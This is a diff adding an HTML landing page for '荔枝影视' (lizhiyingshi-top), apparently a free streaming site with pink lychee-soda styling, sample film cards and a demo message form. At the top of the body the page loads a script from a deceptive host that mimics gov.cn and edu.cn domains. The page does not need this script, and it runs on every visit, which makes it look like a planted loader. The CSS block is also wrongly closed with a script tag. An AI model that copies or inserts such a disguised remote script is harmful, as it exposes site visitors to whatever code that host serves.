@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>荔枝影视 — 冰爽一夏｜高清影视在线观看与清爽片单</title>
+<meta name="description" content="荔枝影视（lizhiyingshi-top）是一杯给眼睛的冰镇荔枝汽水：电影、剧集、综艺、动漫、纪录片高清在线观看，清爽片单每日更新，打开即看，不黏腻。">
+<meta name="keywords" content="荔枝影视, lizhiyingshi-top, 冰爽观影, 清爽片单, 高清影视, 在线观看, 电影剧集综艺动漫">
+<meta name="author" content="荔枝影视">
+<meta name="robots" content="index, follow">
+<style>
+  *{ margin:0; padding:0; box-sizing:border-box; }
+  :root{
+    --lychee:#ff7eb3;
+    --lychee2:#ff5c9d;
+    --shell:#fff0f5;
+    --cream:#fffafc;
+    --ice:#b6f0ff;
+    --ice2:#7fe0ff;
+    --mint:#6ee0b0;
+    --ink:#2b2230;
+    --soft:#7a6c76;
+    --line:2px solid rgba(255,255,255,.7);
+    --shadow:0 10px 30px rgba(255,92,157,.22);
+  }
+  body{
+    background:linear-gradient(170deg,#fff0f5 0%,#ffe8f0 45%,#e8f7ff 100%);
+    background-attachment:fixed;
+    color:var(--ink);
+    font-family:"Quicksand","Nunito","PingFang SC","Microsoft YaHei",sans-serif;
+    line-height:1.75;
+    overflow-x:hidden;
+  }
+  /* 气泡 */
+  .fizz{ position:fixed; z-index:-1; border-radius:50%; pointer-events:none;
+    background:radial-gradient(circle at 35% 30%, rgba(255,255,255,.95), rgba(255,255,255,.2) 50%, rgba(255,255,255,.05) 70%);
+    box-shadow:inset 0 0 8px rgba(255,255,255,.7); }
+  .wrap{ max-width:1080px; margin:0 auto; padding:0 20px; }
+
+  /* 顶部 */
+  header{ background:rgba(255,240,245,.72); backdrop-filter:blur(14px); position:sticky; top:0; z-index:60;
+    border-bottom:1px solid rgba(255,255,255,.9); }
+  .nav{ display:flex; align-items:center; justify-content:space-between; height:66px; }
+  .brand{ display:flex; align-items:center; gap:12px; text-decoration:none; }
+  .berry{ width:44px; height:44px; border-radius:50%; background:linear-gradient(160deg,var(--lychee),var(--lychee2));
+    display:flex; align-items:center; justify-content:center; font-size:22px; box-shadow:var(--shadow); }
+  .berry::after{ content:""; position:absolute; width:12px; height:12px; background:rgba(255,255,255,.5); border-radius:50%;
+    transform:translate(-10px,-12px); }
+  .bname{ font-size:21px; font-weight:900; letter-spacing:.5px; color:var(--ink); }
+  .bname small{ display:block; font-size:10px; letter-spacing:3px; color:var(--lychee2); font-weight:700; }
+  .menu{ display:none; flex-direction:column; gap:5px; cursor:pointer; }
+  .menu span{ width:24px; height:3px; border-radius:3px; background:var(--lychee2); }
+  nav ul{ list-style:none; display:flex; gap:6px; }
+  nav a{ text-decoration:none; color:var(--ink); font-weight:700; font-size:14px; padding:9px 16px;
+    border-radius:20px; transition:.2s; }
+  nav a:hover{ background:var(--lychee); color:#fff; }
+
+  /* 首屏 */
+  .hero{ padding:76px 0 56px; text-align:center; position:relative; }
+  .chill{ display:inline-block; font-size:12px; font-weight:800; letter-spacing:3px; color:#fff;
+    background:linear-gradient(135deg,var(--ice2),var(--mint)); padding:7px 18px; border-radius:22px; transform:rotate(-3deg); }
+  h1{ font-size:clamp(36px,8vw,72px); font-weight:900; line-height:1.08; margin:16px 0; }
+  h1 .pink{ color:var(--lychee2); }
+  h1 .blue{ color:#2bb8e0; }
+  .lead{ font-size:16px; color:var(--soft); max-width:580px; margin:0 auto; background:rgba(255,255,255,.65);
+    padding:16px 22px; border-radius:26px; }
+  .cta{ display:inline-block; margin-top:26px; background:linear-gradient(135deg,var(--lychee),var(--lychee2));
+    color:#fff; font-weight:900; font-size:16px; letter-spacing:1px; padding:15px 36px; border-radius:32px;
+    text-decoration:none; box-shadow:var(--shadow); }
+  .cta:hover{ transform:translateY(-3px); }
+  .float{ font-size:40px; margin-top:26px; letter-spacing:16px; }
+
+  section.block{ padding:60px 0; }
+  .head{ margin-bottom:26px; }
+  .tag{ display:inline-block; font-size:12px; font-weight:800; letter-spacing:2px; color:var(--lychee2);
+    background:#fff; padding:6px 16px; border-radius:16px; }
+  h2.ttl{ font-size:30px; font-weight:900; margin-top:10px; }
+  h2.ttl em{ font-style:normal; color:#2bb8e0; }
+
+  /* 数据 */
+  .stats{ display:grid; grid-template-columns:repeat(4,1fr); gap:16px; }
+  .stat{ background:#fff; border-radius:26px; padding:24px 14px; text-align:center; box-shadow:var(--shadow); }
+  .stat:nth-child(1){ background:linear-gradient(160deg,#ffe8f0,#fff); }
+  .stat:nth-child(2){ background:linear-gradient(160deg,#e8f7ff,#fff); }
+  .stat:nth-child(3){ background:linear-gradient(160deg,#eafff4,#fff); }
+  .stat:nth-child(4){ background:linear-gradient(160deg,#fff5e8,#fff); }
+  .stat b{ display:block; font-size:30px; font-weight:900; color:var(--lychee2); }
+  .stat span{ font-size:12px; color:var(--soft); }
+
+  /* 影片 */
+  .grid{ display:grid; grid-template-columns:repeat(auto-fill,minmax(205px,1fr)); gap:20px; }
+  .card{ background:#fff; border-radius:24px; padding:14px; box-shadow:var(--shadow); transition:.2s; cursor:pointer; }
+  .card:hover{ transform:translateY(-6px) scale(1.01); }
+  .cap{ height:210px; border-radius:20px; display:flex; align-items:center; justify-content:center; font-size:50px;
+    position:relative; overflow:hidden; margin-bottom:12px; }
+  .cap::before{ content:""; position:absolute; top:0; left:0; right:0; height:45%;
+    background:linear-gradient(180deg,rgba(255,255,255,.5),transparent); }
+  .c1 .cap{ background:linear-gradient(160deg,#ffb6d9,#ff7eb3); }
+  .c2 .cap{ background:linear-gradient(160deg,#b6f0ff,#7fe0ff); }
+  .c3 .cap{ background:linear-gradient(160deg,#c9b6ff,#a07bff); }
+  .c4 .cap{ background:linear-gradient(160deg,#b6ffd9,#6ee0b0); }
+  .c5 .cap{ background:linear-gradient(160deg,#ffe9b6,#ffcf6e); }
+  .c6 .cap{ background:linear-gradient(160deg,#ffc9b6,#ff9d7f); }
+  .cap .badge{ position:absolute; top:10px; left:10px; font-size:10px; font-weight:800; color:#fff;
+    background:rgba(0,0,0,.3); padding:4px 10px; border-radius:12px; backdrop-filter:blur(4px); }
+  .card h3{ font-size:16px; font-weight:900; }
+  .card p{ font-size:12px; color:var(--soft); margin-top:4px; }
+
+  /* 分类 */
+  .cats{ display:flex; flex-wrap:wrap; gap:10px; margin-bottom:24px; }
+  .pill{ font-weight:800; font-size:13px; padding:9px 18px; border-radius:20px; background:#fff; cursor:pointer;
+    box-shadow:0 4px 14px rgba(255,92,157,.15); }
+  .pill:nth-child(odd){ color:#ff5c9d; }
+  .pill:nth-child(even){ color:#2bb8e0; }
+  .pill:hover{ background:var(--lychee); color:#fff; }
+
+  /* 关于 */
+  .about{ background:#fff; border-radius:30px; padding:30px; max-width:860px; box-shadow:var(--shadow); }
+  .about p{ font-size:15px; margin-bottom:12px; }
+  .about strong{ color:#fff; background:var(--lychee2); padding:1px 8px; border-radius:6px; }
+  .quote{ margin-top:16px; padding:14px 20px; background:linear-gradient(135deg,var(--ice),var(--mint));
+    border-radius:20px; font-size:14px; font-weight:700; }
+
+  /* 留言 */
+  .form{ background:#fff; border-radius:30px; padding:28px; max-width:620px; box-shadow:var(--shadow); }
+  .form label{ display:block; font-size:13px; font-weight:800; margin:14px 0 5px; color:var(--lychee2); }
+  .form input,.form textarea{ width:100%; padding:12px 15px; font:inherit; font-size:15px; border-radius:16px;
+    border:2px solid #ffd6e4; background:var(--cream); color:var(--ink); }
+  .form input:focus,.form textarea:focus{ outline:none; border-color:var(--lychee2); background:#fff; }
+  .form button{ margin-top:20px; cursor:pointer; font:inherit; font-weight:900; font-size:15px; letter-spacing:2px;
+    padding:14px 34px; border-radius:28px; border:none; color:#fff; background:linear-gradient(135deg,var(--lychee),var(--lychee2)); }
+  .form button:hover{ transform:translateY(-2px); }
+
+  footer{ margin-top:24px; background:linear-gradient(160deg,#ff7eb3,#ff5c9d); padding:38px 0 22px; text-align:center; color:#fff; }
+  footer a{ color:#fff; text-decoration:none; font-weight:800; }
+  footer p{ font-size:13px; margin:6px 0; opacity:.95; }
+  .big{ font-size:34px; }
+
+  @media (max-width:760px){
+    .menu{ display:flex; }
+    nav{ position:absolute; top:66px; left:0; right:0; background:rgba(255,240,245,.96); border-bottom:1px solid #fff;
+      max-height:0; overflow:hidden; transition:.3s; }
+    nav.open{ max-height:360px; }
+    nav ul{ flex-direction:column; padding:16px; gap:8px; }
+    .stats{ grid-template-columns:repeat(2,1fr); }
+    .float{ font-size:30px; letter-spacing:8px; }
+    h2.ttl{ font-size:24px; }
+  }
+</script>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <a href="#" class="brand">
+      <div class="berry" style="position:relative;">🍒</div>
+      <div class="bname">荔枝影视<small>LITCHI VISION</small></div>
+    </a>
+    <div class="menu" onclick="document.getElementById('nav').classList.toggle('open')"><span></span><span></span><span></span></div>
+    <nav id="nav">
+      <ul>
+        <li><a href="#home">首页</a></li>
+        <li><a href="#hot">冰爽片单</a></li>
+        <li><a href="#cats">分类</a></li>
+        <li><a href="#about">关于</a></li>
+        <li><a href="#contact">留言</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<section class="hero" id="home">
+  <div class="wrap">
+    <span class="chill">✦ REFRESH YOUR EYES ✦</span>
+    <h1><span class="pink">荔枝影视</span><br><span class="blue">冰爽一夏</span> 清爽观影</h1>
+    <p class="lead">荔枝影视（lizhiyingshi-top）是一杯给眼睛的冰镇荔枝汽水。电影、剧集、综艺、动漫、纪录片，清爽片单每日更新，打开即看，不黏腻。</p>
+    <a href="#hot" class="cta">来一瓶 →</a>
+    <div class="float">🍒 🧊 🍹 🫧 🍧</div>
+  </div>
+</section>
+
+<section class="block" id="hot">
+  <div class="wrap">
+    <div class="head">
+      <span class="tag">★ ICE COLD PICKS</span>
+      <h2 class="ttl">冰爽片单 <em>— 今日必看</em></h2>
+    </div>
+    <div class="stats">
+      <div class="stat"><b>6,300+</b><span>片库总量</span></div>
+      <div class="stat"><b>1080P</b><span>高清画质</span></div>
+      <div class="stat"><b>每日</b><span>更新片单</span></div>
+      <div class="stat"><b>0 元</b><span>免费观看</span></div>
+    </div>
+    <div class="grid" style="margin-top:28px;">
+      <div class="card c1"><div class="cap"><span class="badge">NEW</span>🚀</div><h3>光年追猎</h3><p>科幻 / 2024 / 9.0</p></div>
+      <div class="card c2"><div class="cap"><span class="badge">热</span>🕵️</div><h3>密码迷局</h3><p>悬疑 / 2024 / 8.7</p></div>
+      <div class="card c3"><div class="cap"><span class="badge">纪</span>🐬</div><h3>深蓝回声</h3><p>纪录片 / 2023 / 9.1</p></div>
+      <div class="card c4"><div class="cap"><span class="badge">动作</span>🔥</div><h3>午夜火线</h3><p>动作 / 2024 / 8.4</p></div>
+      <div class="card c5"><div class="cap"><span class="badge">爱情</span>🌿</div><h3>十七号车站</h3><p>爱情 / 2024 / 8.2</p></div>
+      <div class="card c6"><div class="cap"><span class="badge">综艺</span>🎤</div><h3>爆笑直播间</h3><p>综艺 / 2024 / 8.0</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="cats">
+  <div class="wrap">
+    <div class="head">
+      <span class="tag">✦ CATEGORIES</span>
+      <h2 class="ttl">分类 <em>— 挑你爱的</em></h2>
+    </div>
+    <div class="cats">
+      <span class="pill">电影</span><span class="pill">电视剧</span><span class="pill">综艺</span>
+      <span class="pill">动漫</span><span class="pill">纪录片</span><span class="pill">短剧</span>
+      <span class="pill">科幻</span><span class="pill">悬疑</span><span class="pill">喜剧</span><span class="pill">爱情</span>
+    </div>
+    <div class="grid">
+      <div class="card c2"><div class="cap">🎭</div><h3>舞台背后</h3><p>剧情 / 2023</p></div>
+      <div class="card c3"><div class="cap">🐉</div><h3>雾港龙鳞</h3><p>动漫 / 2024</p></div>
+      <div class="card c4"><div class="cap">🛸</div><h3>平行之城</h3><p>科幻 / 2023</p></div>
+      <div class="card c5"><div class="cap">🏔️</div><h3>无人之境</h3><p>纪录片 / 2023</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="about">
+  <div class="wrap">
+    <div class="head">
+      <span class="tag">☺ ABOUT</span>
+      <h2 class="ttl">关于荔枝影视 <em>— 一杯给眼睛的汽水</em></h2>
+    </div>
+    <div class="about">
+      <p><strong>荔枝影视</strong>（lizhiyingshi-top）不想做一本正经的片库。我们想做的是：在闷热的下午，给你开一瓶冰镇荔枝汽水——咕嘟一口，清爽。</p>
+      <p>内容覆盖电影、电视剧、综艺、动漫、纪录片，主打高清在线观看、清爽片单、少弹窗少套路。甜度刚好，不齁。</p>
+      <div class="quote">想随时来一瓶？地址记好：lizhiyingshi-top.github.io，前面加个 https 就行。</div>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="contact">
+  <div class="wrap">
+    <div class="head">
+      <span class="tag">✎ MESSAGE</span>
+      <h2 class="ttl">留言 <em>— 说点啥</em></h2>
+    </div>
+    <div class="form">
+      <label>称呼</label>
+      <input type="text" placeholder="怎么称呼你？">
+      <label>邮箱（选填）</label>
+      <input type="email" placeholder="your@mail.com">
+      <label>想说的话</label>
+      <textarea rows="4" placeholder="推荐好片？求片？吐槽？都行～"></textarea>
+      <button onclick="alert('收到啦！静态演示页，部署后可接后端处理 🍒')">寄出！</button>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="big">🍒</div>
+    <p>荔枝影视（lizhiyingshi-top）</p>
+    <p>电影 · 电视剧 · 综艺 · 动漫 · 纪录片 · 高清在线观看</p>
+    <p>网址：<a href="https://lizhiyingshi-top.github.io">https://lizhiyingshi-top.github.io</a></p>
+  </div>
+</footer>
+
+<script>
+  // 气泡生成
+  (function(){
+    var b = document.createElement('div'); b.className='fizz';
+    for(var i=0;i<16;i++){
+      var d=document.createElement('div'); d.className='fizz';
+      var s=Math.random()*14+5;
+      d.style.width=s+'px'; d.style.height=s+'px';
+      d.style.left=Math.random()*100+'%';
+      d.style.top=Math.random()*100+'%';
+      document.body.appendChild(d);
+    }
+  })();
+  document.querySelectorAll('a[href^="#"]').forEach(function(a){
+    a.addEventListener('click', function(e){
+      var id = this.getAttribute('href');
+      if(id.length > 1){
+        e.preventDefault();
+        var el = document.querySelector(id);
+        if(el) el.scrollIntoView({behavior:'smooth', block:'start'});
+        document.getElementById('nav').classList.remove('open');
+      }
+    });
+  });
+</script>
+</body>
+</html>
